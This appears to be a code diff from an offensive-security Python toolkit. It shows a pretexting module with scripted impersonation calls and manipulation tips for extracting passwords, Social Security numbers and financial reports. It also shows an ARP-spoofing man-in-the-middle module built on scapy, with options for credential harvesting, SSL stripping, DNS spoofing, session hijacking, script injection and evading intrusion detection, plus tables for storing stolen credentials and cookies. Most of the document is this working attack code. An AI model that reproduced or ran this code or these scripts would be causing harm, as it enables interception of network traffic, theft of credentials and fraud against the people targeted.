-            with open(filename, 'w', encoding='utf-8') as f:
-                f.write(html_content)
-            return filename
-        except Exception as e:
-            print(f"{Fore.RED}✗ ERROR: Failed to write dashboard: {str(e)}{Style.RESET_ALL}")
-            return None
-
-    def run_pretexting(self):
-        """Pretexting scenario generator"""
-        scenario = self.module_options.get('scenario', 'it_support')
-        company = self.module_options.get('company', 'TechCorp')
-        urgency = self.module_options.get('urgency', 'high')
-        
-        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}║ PRETEXTING SCENARIO GENERATOR ║{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
-        
-        scenarios = {
-            'it_support': {
-                'role': 'IT Support Technician',
-                'opening': f"Hi, this is Alex from {company} IT Support. We've detected some suspicious activity on your account.",
-                'urgency_reason': 'Your account may be compromised. We need to verify your identity immediately.',
-                'request': 'Can you verify your employee ID and current password so I can reset it for you?',
-                'alternative': 'Could you click this verification link to secure your account?'
-            },
-            'vendor': {
-                'role': 'Vendor/Supplier',
-                'opening': f"Good morning, I'm calling from {company}'s main supplier. We need to update our billing information.",
-                'urgency_reason': 'Our payment system was updated and we need to confirm your details to avoid service interruption.',
-                'request': 'Can you provide the accounts payable contact and their email?',
-                'alternative': 'Could you forward this billing update form to your finance department?'
-            },
-            'executive': {
-                'role': 'Executive Assistant',
-                'opening': f"Hi, I'm calling on behalf of {company}'s CEO who is traveling.",
-                'urgency_reason': 'The CEO needs urgent access to a file for a board meeting happening in 30 minutes.',
-                'request': 'Can you email the Q4 financial report to this temporary address?',
-                'alternative': 'Could you reset the CEO\'s VPN password and send it to me?'
-            },
-            'hr': {
-                'role': 'HR Representative',
-                'opening': f"Hello, this is Sarah from {company} Human Resources.",
-                'urgency_reason': 'We need to update employee records before the audit tomorrow.',
-                'request': 'Can you verify your social security number and home address?',
-                'alternative': 'Please fill out this employee verification form we\'re emailing you.'
-            },
-            'security': {
-                'role': 'Security Officer',
-                'opening': f"This is Officer Johnson from {company} Corporate Security.",
-                'urgency_reason': 'We detected unauthorized access attempts to your account.',
-                'request': 'I need you to change your password right now while I verify your identity.',
-                'alternative': 'Click this secure link to update your security settings immediately.'
+    </body>
+    </html>"""
+            
+            filename = f"sms_dashboard_{timestamp}.html"
+            try:
+                with open(filename, 'w', encoding='utf-8') as f:
+                    f.write(html_content)
+                return filename
+            except Exception as e:
+                print(f"{Fore.RED}✗ ERROR: Failed to write dashboard: {str(e)}{Style.RESET_ALL}")
+                return None
+    
+        def run_pretexting(self):
+            """Pretexting scenario generator"""
+            scenario = self.module_options.get('scenario', 'it_support')
+            company = self.module_options.get('company', 'TechCorp')
+            urgency = self.module_options.get('urgency', 'high')
+            
+            print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}║ PRETEXTING SCENARIO GENERATOR ║{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
+            
+            scenarios = {
+                'it_support': {
+                    'role': 'IT Support Technician',
+                    'opening': f"Hi, this is Alex from {company} IT Support. We've detected some suspicious activity on your account.",
+                    'urgency_reason': 'Your account may be compromised. We need to verify your identity immediately.',
+                    'request': 'Can you verify your employee ID and current password so I can reset it for you?',
+                    'alternative': 'Could you click this verification link to secure your account?'
+                },
+                'vendor': {
+                    'role': 'Vendor/Supplier',
+                    'opening': f"Good morning, I'm calling from {company}'s main supplier. We need to update our billing information.",
+                    'urgency_reason': 'Our payment system was updated and we need to confirm your details to avoid service interruption.',
+                    'request': 'Can you provide the accounts payable contact and their email?',
+                    'alternative': 'Could you forward this billing update form to your finance department?'
+                },
+                'executive': {
+                    'role': 'Executive Assistant',
+                    'opening': f"Hi, I'm calling on behalf of {company}'s CEO who is traveling.",
+                    'urgency_reason': 'The CEO needs urgent access to a file for a board meeting happening in 30 minutes.',
+                    'request': 'Can you email the Q4 financial report to this temporary address?',
+                    'alternative': 'Could you reset the CEO\'s VPN password and send it to me?'
+                },
+                'hr': {
+                    'role': 'HR Representative',
+                    'opening': f"Hello, this is Sarah from {company} Human Resources.",
+                    'urgency_reason': 'We need to update employee records before the audit tomorrow.',
+                    'request': 'Can you verify your social security number and home address?',
+                    'alternative': 'Please fill out this employee verification form we\'re emailing you.'
+                },
+                'security': {
+                    'role': 'Security Officer',
+                    'opening': f"This is Officer Johnson from {company} Corporate Security.",
+                    'urgency_reason': 'We detected unauthorized access attempts to your account.',
+                    'request': 'I need you to change your password right now while I verify your identity.',
+                    'alternative': 'Click this secure link to update your security settings immediately.'
+                }
             }
-        }
-        
-        if scenario in scenarios:
-            s = scenarios[scenario]
-            print(f"{Fore.YELLOW}Scenario: {Fore.WHITE}{scenario.replace('_', ' ').title()}{Style.RESET_ALL}")
-            print(f"{Fore.YELLOW}Role: {Fore.WHITE}{s['role']}{Style.RESET_ALL}")
-            print(f"{Fore.YELLOW}Company: {Fore.WHITE}{company}{Style.RESET_ALL}")
-            print(f"{Fore.YELLOW}Urgency: {Fore.WHITE}{urgency.upper()}{Style.RESET_ALL}\n")
             
-            print(f"{Fore.CYAN}═══ SCRIPT ═══{Style.RESET_ALL}\n")
-            print(f"{Fore.GREEN}Opening:{Style.RESET_ALL}")
-            print(f"{Fore.WHITE}\"{s['opening']}\"{Style.RESET_ALL}\n")
+            if scenario in scenarios:
+                s = scenarios[scenario]
+                print(f"{Fore.YELLOW}Scenario: {Fore.WHITE}{scenario.replace('_', ' ').title()}{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}Role: {Fore.WHITE}{s['role']}{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}Company: {Fore.WHITE}{company}{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}Urgency: {Fore.WHITE}{urgency.upper()}{Style.RESET_ALL}\n")
+                
+                print(f"{Fore.CYAN}═══ SCRIPT ═══{Style.RESET_ALL}\n")
+                print(f"{Fore.GREEN}Opening:{Style.RESET_ALL}")
+                print(f"{Fore.WHITE}\"{s['opening']}\"{Style.RESET_ALL}\n")
+                
+                print(f"{Fore.YELLOW}Urgency Factor:{Style.RESET_ALL}")
+                print(f"{Fore.WHITE}\"{s['urgency_reason']}\"{Style.RESET_ALL}\n")
+                
+                print(f"{Fore.RED}Primary Request:{Style.RESET_ALL}")
+                print(f"{Fore.WHITE}\"{s['request']}\"{Style.RESET_ALL}\n")
+                
+                print(f"{Fore.BLUE}Alternative Approach:{Style.RESET_ALL}")
+                print(f"{Fore.WHITE}\"{s['alternative']}\"{Style.RESET_ALL}\n")
+                
+                print(f"{Fore.CYAN}═══ TIPS ═══{Style.RESET_ALL}\n")
+                print(f" • Use confident, authoritative tone")
+                print(f" • Build rapport before making requests")
+                print(f" • Create time pressure with urgency")
+                print(f" • Use company-specific terminology")
+                print(f" • Have plausible answers for questions")
+                print(f" • Know when to abandon if suspicious\n")
+        
+        # ============ NETWORK ATTACK MODULES ============
+        
+        def run_arp_spoof(self):
+            """
+            Enterprise ARP Spoofing & MITM Platform
+            Complete Man-in-the-Middle attack platform with credential harvesting
+            """
+            from colorama import Fore, Style
+            import os
+            import time
+            import signal
+            import sys
             
-            print(f"{Fore.YELLOW}Urgency Factor:{Style.RESET_ALL}")
-            print(f"{Fore.WHITE}\"{s['urgency_reason']}\"{Style.RESET_ALL}\n")
+            print(f"\n{Fore.CYAN}{'=' * 70}")
+            print(f"  ARP SPOOF & MITM PLATFORM - ENTERPRISE EDITION")
+            print(f"{'=' * 70}{Style.RESET_ALL}\n")
             
-            print(f"{Fore.RED}Primary Request:{Style.RESET_ALL}")
-            print(f"{Fore.WHITE}\"{s['request']}\"{Style.RESET_ALL}\n")
-            
-            print(f"{Fore.BLUE}Alternative Approach:{Style.RESET_ALL}")
-            print(f"{Fore.WHITE}\"{s['alternative']}\"{Style.RESET_ALL}\n")
-            
-            print(f"{Fore.CYAN}═══ TIPS ═══{Style.RESET_ALL}\n")
-            print(f" • Use confident, authoritative tone")
-            print(f" • Build rapport before making requests")
-            print(f" • Create time pressure with urgency")
-            print(f" • Use company-specific terminology")
-            print(f" • Have plausible answers for questions")
-            print(f" • Know when to abandon if suspicious\n")
-    
-    # ============ NETWORK ATTACK MODULES ============
-    
-    def run_arp_spoof(self):
-        """
-        Enterprise ARP Spoofing & MITM Platform
-        Complete Man-in-the-Middle attack platform with credential harvesting
-        """
-        from colorama import Fore, Style
-        import os
-        import time
-        import signal
-        import sys
-        
-        print(f"\n{Fore.CYAN}{'=' * 70}")
-        print(f"  ARP SPOOF & MITM PLATFORM - ENTERPRISE EDITION")
-        print(f"{'=' * 70}{Style.RESET_ALL}\n")
-        
-        # Check for scapy
-        try:
-            from scapy.all import ARP, Ether, send, sniff, get_if_hwaddr, conf, srp, wrpcap
-            SCAPY_AVAILABLE = True
-        except ImportError:
-            print(f"{Fore.RED}✗ ERROR: Scapy not available{Style.RESET_ALL}")
-            print(f"{Fore.BLUE}ℹ  Install: pip3 install scapy{Style.RESET_ALL}\n")
-            return
-        
-        # Check root privileges
-        if os.geteuid() != 0:
-            print(f"{Fore.RED}✗ ERROR: Root privileges required{Style.RESET_ALL}")
-            print(f"{Fore.BLUE}ℹ  Run with: sudo python3 kndys.py{Style.RESET_ALL}\n")
-            return
-        
-        # Load configuration
-        config = self._load_arp_spoof_config()
-        if not config:
-            print(f"{Fore.RED}✗ ERROR: Failed to load configuration{Style.RESET_ALL}")
-            return
-        
-        # Display configuration
-        self._display_arp_spoof_config(config)
-        
-        # Confirm attack
-        if config['confirm_targets']:
-            response = input(f"\n{Fore.YELLOW}⚠  Proceed with MITM attack? (yes/no): {Style.RESET_ALL}")
-            if response.lower() not in ['yes', 'y']:
-                print(f"{Fore.BLUE}ℹ  Attack cancelled{Style.RESET_ALL}")
+            # Check for scapy
+            try:
+                from scapy.all import ARP, Ether, send, sniff, get_if_hwaddr, conf, srp, wrpcap
+                SCAPY_AVAILABLE = True
+            except ImportError:
+                print(f"{Fore.RED}✗ ERROR: Scapy not available{Style.RESET_ALL}")
+                print(f"{Fore.BLUE}ℹ  Install: pip3 install scapy{Style.RESET_ALL}\n")
                 return
-        
-        # Initialize database
-        if config['enable_database']:
-            try:
-                self._initialize_mitm_database(config)
-                print(f"{Fore.GREEN}✓ Database initialized{Style.RESET_ALL}\n")
-            except Exception as e:
-                print(f"{Fore.YELLOW}⚠ WARNING: Database init failed - continuing without DB{Style.RESET_ALL}\n")
-        
-        # Backup ARP tables
-        if config['backup_arp_tables']:
-            self._backup_arp_tables(config)
-        
-        # Enable IP forwarding
-        if config['enable_ip_forward']:
-            self._enable_ip_forwarding()
-            print(f"{Fore.GREEN}✓ IP forwarding enabled{Style.RESET_ALL}")
-        
-        # Setup signal handlers
-        def signal_handler(sig, frame):
-            print(f"\n\n{Fore.YELLOW}⚠  Interrupt received - cleaning up...{Style.RESET_ALL}\n")
-            self._cleanup_arp_spoof(config)
-            sys.exit(0)
-        
-        signal.signal(signal.SIGINT, signal_handler)
-        signal.signal(signal.SIGTERM, signal_handler)
-        
-        # Get MAC addresses
-        print(f"{Fore.CYAN}━━━ RESOLVING MAC ADDRESSES ━━━{Style.RESET_ALL}\n")
-        target_mac = self._get_mac_address(config['target_ip'], config['interface'])
-        gateway_mac = self._get_mac_address(config['gateway_ip'], config['interface'])
-        
-        if not target_mac or not gateway_mac:
-            print(f"{Fore.RED}✗ ERROR: Could not resolve MAC addresses{Style.RESET_ALL}")
-            return
-        
-        print(f"{Fore.GREEN}✓ Target MAC:  {target_mac}{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}✓ Gateway MAC: {gateway_mac}{Style.RESET_ALL}\n")
-        
-        # Start packet capture
-        if config['enable_packet_capture']:
-            print(f"{Fore.CYAN}━━━ STARTING PACKET CAPTURE ━━━{Style.RESET_ALL}\n")
-            self._start_packet_capture(config)
-        
-        # Start ARP poisoning
-        print(f"{Fore.CYAN}━━━ STARTING ARP POISONING ━━━{Style.RESET_ALL}\n")
-        print(f"{Fore.YELLOW}→ Mode: {config['mode']}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}→ Interval: {config['poison_interval']}s{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}→ MITM active - press Ctrl+C to stop{Style.RESET_ALL}\n")
-        
-        # Main attack loop
-        self._arp_poison_loop(config, target_mac, gateway_mac)
-
-
-    def _load_arp_spoof_config(self):
-        """Load and validate ARP spoof configuration"""
-        try:
-            config = {
-                # Core
-                'campaign_name': str(self.module_options.get('campaign_name', 'mitm_operation')),
-                'interface': str(self.module_options.get('interface', 'eth0')),
-                'target_ip': str(self.module_options.get('target_ip', '192.168.1.100')),
-                'gateway_ip': str(self.module_options.get('gateway_ip', '192.168.1.1')),
-                'target_list': str(self.module_options.get('target_list', '')),
-                'mode': str(self.module_options.get('mode', 'bidirectional')),
-                
-                # ARP poisoning
-                'poison_interval': int(self.module_options.get('poison_interval', '2')),
-                'poison_count': int(self.module_options.get('poison_count', '0')),
-                'restore_arp': self._parse_bool(self.module_options.get('restore_arp', 'true')),
-                'enable_ip_forward': self._parse_bool(self.module_options.get('enable_ip_forward', 'true')),
-                'spoof_mac': str(self.module_options.get('spoof_mac', '')),
-                'random_mac': self._parse_bool(self.module_options.get('random_mac', 'false')),
-                
-                # MITM attacks
-                'enable_packet_capture': self._parse_bool(self.module_options.get('enable_packet_capture', 'true')),
-                'enable_ssl_strip': self._parse_bool(self.module_options.get('enable_ssl_strip', 'true')),
-                'enable_dns_spoof': self._parse_bool(self.module_options.get('enable_dns_spoof', 'true')),
-                'enable_credential_harvest': self._parse_bool(self.module_options.get('enable_credential_harvest', 'true')),
-                'enable_session_hijack': self._parse_bool(self.module_options.get('enable_session_hijack', 'false')),
-                'enable_traffic_injection': self._parse_bool(self.module_options.get('enable_traffic_injection', 'false')),
-                'enable_downgrade_attack': self._parse_bool(self.module_options.get('enable_downgrade_attack', 'true')),
-                
-                # Packet capture
-                'capture_filter': str(self.module_options.get('capture_filter', '')),
-                'capture_protocols': str(self.module_options.get('capture_protocols', 'all')),
-                'capture_file': str(self.module_options.get('capture_file', 'mitm_capture.pcap')),
-                'capture_limit': int(self.module_options.get('capture_limit', '0')),
-                'save_raw_data': self._parse_bool(self.module_options.get('save_raw_data', 'true')),
-                'save_dissected': self._parse_bool(self.module_options.get('save_dissected', 'true')),
-                
-                # Credential harvesting
-                'harvest_http': self._parse_bool(self.module_options.get('harvest_http', 'true')),
-                'harvest_ftp': self._parse_bool(self.module_options.get('harvest_ftp', 'true')),
-                'harvest_smtp': self._parse_bool(self.module_options.get('harvest_smtp', 'true')),
-                'harvest_pop3': self._parse_bool(self.module_options.get('harvest_pop3', 'true')),
-                'harvest_imap': self._parse_bool(self.module_options.get('harvest_imap', 'true')),
-                'harvest_telnet': self._parse_bool(self.module_options.get('harvest_telnet', 'true')),
-                'harvest_ssh_keys': self._parse_bool(self.module_options.get('harvest_ssh_keys', 'false')),
-                'harvest_cookies': self._parse_bool(self.module_options.get('harvest_cookies', 'true')),
-                'harvest_post_data': self._parse_bool(self.module_options.get('harvest_post_data', 'true')),
-                'log_passwords': self._parse_bool(self.module_options.get('log_passwords', 'true')),
-                'hash_passwords': self._parse_bool(self.module_options.get('hash_passwords', 'false')),
-                
-                # SSL stripping
-                'sslstrip_port': int(self.module_options.get('sslstrip_port', '10000')),
-                'sslstrip_mode': str(self.module_options.get('sslstrip_mode', 'transparent')),
-                'sslstrip_domains': str(self.module_options.get('sslstrip_domains', '')),
-                'sslstrip_hsts_bypass': self._parse_bool(self.module_options.get('sslstrip_hsts_bypass', 'true')),
-                'sslstrip_log': str(self.module_options.get('sslstrip_log', 'sslstrip.log')),
-                'replace_https_links': self._parse_bool(self.module_options.get('replace_https_links', 'true')),
-                'fake_ssl_lock': self._parse_bool(self.module_options.get('fake_ssl_lock', 'false')),
-                
-                # DNS spoofing
-                'dns_spoof_domains': str(self.module_options.get('dns_spoof_domains', '')),
-                'dns_spoof_ip': str(self.module_options.get('dns_spoof_ip', '192.168.1.100')),
-                'dns_wildcard': self._parse_bool(self.module_options.get('dns_wildcard', 'false')),
-                'dns_log_queries': self._parse_bool(self.module_options.get('dns_log_queries', 'true')),
-                'dns_fake_responses': str(self.module_options.get('dns_fake_responses', '')),
-                'dns_upstream': str(self.module_options.get('dns_upstream', '8.8.8.8')),
-                
-                # Traffic injection
-                'inject_html': str(self.module_options.get('inject_html', '')),
-                'inject_javascript': str(self.module_options.get('inject_javascript', '')),
-                'inject_beef_hook': self._parse_bool(self.module_options.get('inject_beef_hook', 'false')),
-                'beef_server': str(self.module_options.get('beef_server', 'http://localhost:3000')),
-                'inject_position': str(self.module_options.get('inject_position', 'body')),
-                'inject_filter': str(self.module_options.get('inject_filter', 'text/html')),
-                'replace_images': self._parse_bool(self.module_options.get('replace_images', 'false')),
-                'replacement_image': str(self.module_options.get('replacement_image', '')),
-                
-                # Session hijacking
-                'hijack_cookies': self._parse_bool(self.module_options.get('hijack_cookies', 'true')),
-                'hijack_tokens': self._parse_bool(self.module_options.get('hijack_tokens', 'true')),
-                'hijack_jwt': self._parse_bool(self.module_options.get('hijack_jwt', 'true')),
-                'session_replay': self._parse_bool(self.module_options.get('session_replay', 'false')),
-                'cookie_domains': str(self.module_options.get('cookie_domains', '')),
-                
-                # Protocol downgrade
-                'downgrade_https': self._parse_bool(self.module_options.get('downgrade_https', 'true')),
-                'downgrade_ssh': self._parse_bool(self.module_options.get('downgrade_ssh', 'false')),
-                'downgrade_ftps': self._parse_bool(self.module_options.get('downgrade_ftps', 'true')),
-                'strip_security_headers': self._parse_bool(self.module_options.get('strip_security_headers', 'true')),
-                'remove_csp': self._parse_bool(self.module_options.get('remove_csp', 'true')),
-                'remove_hsts': self._parse_bool(self.module_options.get('remove_hsts', 'true')),
-                
-                # Anti-detection
-                'stealth_mode': self._parse_bool(self.module_options.get('stealth_mode', 'true')),
-                'randomize_timing': self._parse_bool(self.module_options.get('randomize_timing', 'true')),
-                'spoof_vendor': str(self.module_options.get('spoof_vendor', '')),
-                'avoid_ids': self._parse_bool(self.module_options.get('avoid_ids', 'true')),
-                'fragment_packets': self._parse_bool(self.module_options.get('fragment_packets', 'false')),
-                'ttl_manipulation': self._parse_bool(self.module_options.get('ttl_manipulation', 'false')),
-                
-                # Monitoring
-                'monitor_bandwidth': self._parse_bool(self.module_options.get('monitor_bandwidth', 'true')),
-                'monitor_connections': self._parse_bool(self.module_options.get('monitor_connections', 'true')),
-                'monitor_protocols': self._parse_bool(self.module_options.get('monitor_protocols', 'true')),
-                'detect_anomalies': self._parse_bool(self.module_options.get('detect_anomalies', 'false')),
-                'log_all_traffic': self._parse_bool(self.module_options.get('log_all_traffic', 'false')),
-                'traffic_analysis': self._parse_bool(self.module_options.get('traffic_analysis', 'true')),
-                
-                # Database & logging
-                'enable_database': self._parse_bool(self.module_options.get('enable_database', 'true')),
-                'db_file': str(self.module_options.get('db_file', 'mitm_operations.db')),
-                'log_file': str(self.module_options.get('log_file', 'arp_spoof.log')),
-                'log_level': str(self.module_options.get('log_level', 'info')),
-                'log_format': str(self.module_options.get('log_format', 'detailed')),
-                'log_rotation': self._parse_bool(self.module_options.get('log_rotation', 'true')),
-                'max_log_size': int(self.module_options.get('max_log_size', '100')),
-                
-                # Targets
-                'target_mode': str(self.module_options.get('target_mode', 'single')),
-                'subnet_scan': self._parse_bool(self.module_options.get('subnet_scan', 'false')),
-                'subnet_range': str(self.module_options.get('subnet_range', '192.168.1.0/24')),
-                'exclude_ips': str(self.module_options.get('exclude_ips', '')),
-                'only_active': self._parse_bool(self.module_options.get('only_active', 'true')),
-                'max_targets': int(self.module_options.get('max_targets', '50')),
-                
-                # Advanced
-                'enable_ettercap': self._parse_bool(self.module_options.get('enable_ettercap', 'false')),
-                'enable_bettercap': self._parse_bool(self.module_options.get('enable_bettercap', 'false')),
-                'custom_filters': str(self.module_options.get('custom_filters', '')),
-                'transparent_proxy': self._parse_bool(self.module_options.get('transparent_proxy', 'false')),
-                'proxy_port': int(self.module_options.get('proxy_port', '8080')),
-                'upstream_proxy': str(self.module_options.get('upstream_proxy', '')),
-                
-                # Reporting
-                'generate_report': self._parse_bool(self.module_options.get('generate_report', 'true')),
-                'report_format': str(self.module_options.get('report_format', 'all')),
-                'report_interval': int(self.module_options.get('report_interval', '60')),
-                'include_pcap': self._parse_bool(self.module_options.get('include_pcap', 'true')),
-                'include_credentials': self._parse_bool(self.module_options.get('include_credentials', 'true')),
-                'include_statistics': self._parse_bool(self.module_options.get('include_statistics', 'true')),
-                'visualize_traffic': self._parse_bool(self.module_options.get('visualize_traffic', 'false')),
-                
-                # Alerts
-                'enable_alerts': self._parse_bool(self.module_options.get('enable_alerts', 'true')),
-                'alert_on_credentials': self._parse_bool(self.module_options.get('alert_on_credentials', 'true')),
-                'alert_on_sessions': self._parse_bool(self.module_options.get('alert_on_sessions', 'true')),
-                'alert_method': str(self.module_options.get('alert_method', 'console')),
-                'webhook_url': str(self.module_options.get('webhook_url', '')),
-                'email_to': str(self.module_options.get('email_to', '')),
-                
-                # Safety
-                'dry_run': self._parse_bool(self.module_options.get('dry_run', 'false')),
-                'test_mode': self._parse_bool(self.module_options.get('test_mode', 'false')),
-                'interactive': self._parse_bool(self.module_options.get('interactive', 'false')),
-                'auto_stop_timer': int(self.module_options.get('auto_stop_timer', '0')),
-                'confirm_targets': self._parse_bool(self.module_options.get('confirm_targets', 'true')),
-                'backup_arp_tables': self._parse_bool(self.module_options.get('backup_arp_tables', 'true')),
-                
-                # Performance
-                'threads': int(self.module_options.get('threads', '4')),
-                'buffer_size': int(self.module_options.get('buffer_size', '65536')),
-                'queue_size': int(self.module_options.get('queue_size', '1000')),
-                'timeout': int(self.module_options.get('timeout', '30')),
-                'retry_count': int(self.module_options.get('retry_count', '3')),
-                'optimize_performance': self._parse_bool(self.module_options.get('optimize_performance', 'true'))
-            }
             
-            return config
-        except Exception as e:
-            print(f"Error loading config: {str(e)}")
-            return None
-
-
-    def _display_arp_spoof_config(self, config):
-        """Display ARP spoof configuration"""
-        from colorama import Fore, Style
-        
-        print(f"{Fore.CYAN}{'=' * 70}")
-        print(f"  CONFIGURATION")
-        print(f"{'=' * 70}{Style.RESET_ALL}\n")
-        
-        print(f"{Fore.YELLOW}  Campaign:{Style.RESET_ALL}")
-        print(f"    • Name:            {Fore.WHITE}{config['campaign_name']}{Style.RESET_ALL}")
-        print(f"    • Interface:       {Fore.WHITE}{config['interface']}{Style.RESET_ALL}")
-        print(f"    • Mode:            {Fore.WHITE}{config['mode']}{Style.RESET_ALL}")
-        
-        print(f"\n{Fore.YELLOW}  Targets:{Style.RESET_ALL}")
-        print(f"    • Target IP:       {Fore.WHITE}{config['target_ip']}{Style.RESET_ALL}")
-        print(f"    • Gateway IP:      {Fore.WHITE}{config['gateway_ip']}{Style.RESET_ALL}")
-        
-        print(f"\n{Fore.YELLOW}  ARP Poisoning:{Style.RESET_ALL}")
-        print(f"    • Interval:        {Fore.WHITE}{config['poison_interval']}s{Style.RESET_ALL}")
-        print(f"    • Restore on exit: {Fore.GREEN if config['restore_arp'] else Fore.RED}{'✓' if config['restore_arp'] else '✗'}{Style.RESET_ALL}")
-        print(f"    • IP Forward:      {Fore.GREEN if config['enable_ip_forward'] else Fore.RED}{'✓' if config['enable_ip_forward'] else '✗'}{Style.RESET_ALL}")
-        
-        print(f"\n{Fore.YELLOW}  MITM Attacks:{Style.RESET_ALL}")
-        print(f"    • Packet Capture:  {Fore.GREEN if config['enable_packet_capture'] else Fore.RED}{'✓' if config['enable_packet_capture'] else '✗'}{Style.RESET_ALL}")
-        print(f"    • SSL Strip:       {Fore.GREEN if config['enable_ssl_strip'] else Fore.RED}{'✓' if config['enable_ssl_strip'] else '✗'}{Style.RESET_ALL}")
-        print(f"    • DNS Spoof:       {Fore.GREEN if config['enable_dns_spoof'] else Fore.RED}{'✓' if config['enable_dns_spoof'] else '✗'}{Style.RESET_ALL}")
-        print(f"    • Credential Harvest: {Fore.GREEN if config['enable_credential_harvest'] else Fore.RED}{'✓' if config['enable_credential_harvest'] else '✗'}{Style.RESET_ALL}")
-        
-        print(f"\n{Fore.YELLOW}  Harvesting:{Style.RESET_ALL}")
-        protocols = []
-        if config['harvest_http']: protocols.append('HTTP')
-        if config['harvest_ftp']: protocols.append('FTP')
-        if config['harvest_smtp']: protocols.append('SMTP')
-        if config['harvest_telnet']: protocols.append('Telnet')
-        print(f"    • Protocols:       {Fore.WHITE}{', '.join(protocols) if protocols else 'None'}{Style.RESET_ALL}")
-        
-        print(f"\n{Fore.YELLOW}  Database:{Style.RESET_ALL}")
-        print(f"    • Enabled:         {Fore.GREEN if config['enable_database'] else Fore.RED}{'✓' if config['enable_database'] else '✗'}{Style.RESET_ALL}")
-        if config['enable_database']:
-            print(f"    • DB File:         {Fore.WHITE}{config['db_file']}{Style.RESET_ALL}")
-        
-        print()
-
-
-    def _initialize_mitm_database(self, config):
-        """Initialize SQLite database for MITM operations"""
-        import sqlite3
-        
-        conn = sqlite3.connect(config['db_file'])
-        cursor = conn.cursor()
-        
-        # Campaigns table
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS campaigns (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                name TEXT NOT NULL,
-                target_ip TEXT,
-                gateway_ip TEXT,
-                interface TEXT,
-                start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                end_time TIMESTAMP,
-                packets_captured INTEGER DEFAULT 0,
-                credentials_found INTEGER DEFAULT 0,
-                status TEXT DEFAULT 'active'
-            )
-        ''')
-        
-        # Packets table
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS packets (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                campaign_id INTEGER,
-                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                source_ip TEXT,
-                dest_ip TEXT,
-                protocol TEXT,
-                source_port INTEGER,
-                dest_port INTEGER,
-                payload_size INTEGER,
-                raw_data BLOB,
-                FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
-            )
-        ''')
-        
-        # Credentials table
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS credentials (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                campaign_id INTEGER,
-                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                protocol TEXT,
-                source_ip TEXT,
-                dest_ip TEXT,
-                username TEXT,
-                password TEXT,
-                additional_data TEXT,
-                FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
-            )
-        ''')
-        
-        # Sessions table
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS sessions (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                campaign_id INTEGER,
-                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                source_ip TEXT,
-                dest_ip TEXT,
-                session_id TEXT,
-                cookies TEXT,
-                tokens TEXT,
-                FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
-            )
-        ''')
-        
-        # DNS queries table
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS dns_queries (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                campaign_id INTEGER,
-                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                source_ip TEXT,
-                query_domain TEXT,
-                query_type TEXT,
-                response_ip TEXT,
-                spoofed BOOLEAN DEFAULT 0,
-                FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
-            )
-        ''')
-        
-        # Insert campaign record
-        cursor.execute('''
-            INSERT INTO campaigns (name, target_ip, gateway_ip, interface)
-            VALUES (?, ?, ?, ?)
-        ''', (config['campaign_name'], config['target_ip'], config['gateway_ip'], config['interface']))
-        
-        conn.commit()
-        conn.close()
-
-
-    def _enable_ip_forwarding(self):
-        """Enable IP forwarding"""
-        import os
-        try:
-            os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
-            return True
-        except Exception as e:
-            return False
-
-
-    def _backup_arp_tables(self, config):
-        """Backup current ARP tables"""
-        import os
-        from colorama import Fore, Style
-        try:
-            os.system(f"arp -a > arp_backup_{int(time.time())}.txt")
-            print(f"{Fore.GREEN}✓ ARP tables backed up{Style.RESET_ALL}")
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-
-
-    def _get_mac_address(self, ip, interface):
-        """Get MAC address for IP"""
-        from scapy.all import ARP, Ether, srp
-        try:
-            arp_request = ARP(pdst=ip)
-            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-            arp_request_broadcast = broadcast / arp_request
-            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False, iface=interface)[0]
+            # Check root privileges
+            if os.geteuid() != 0:
+                print(f"{Fore.RED}✗ ERROR: Root privileges required{Style.RESET_ALL}")
+                print(f"{Fore.BLUE}ℹ  Run with: sudo python3 kndys.py{Style.RESET_ALL}\n")
+                return
             
-            if answered_list:
-                return answered_list[0][1].hwsrc
-            return None
-        except Exception as e:
-            return None
-
-
-    def _start_packet_capture(self, config):
-        """Start packet capture in background"""
-        from colorama import Fore, Style
-        import threading
-        
-        def capture_packets():
-            from scapy.all import sniff, wrpcap
+            # Load configuration
+            config = self._load_arp_spoof_config()
+            if not config:
+                print(f"{Fore.RED}✗ ERROR: Failed to load configuration{Style.RESET_ALL}")
+                return
             
-            filter_str = config['capture_filter'] if config['capture_filter'] else None
+            # Display configuration
+            self._display_arp_spoof_config(config)
             
-            def packet_handler(packet):
-                # Process packet
-                self._process_captured_packet(packet, config)
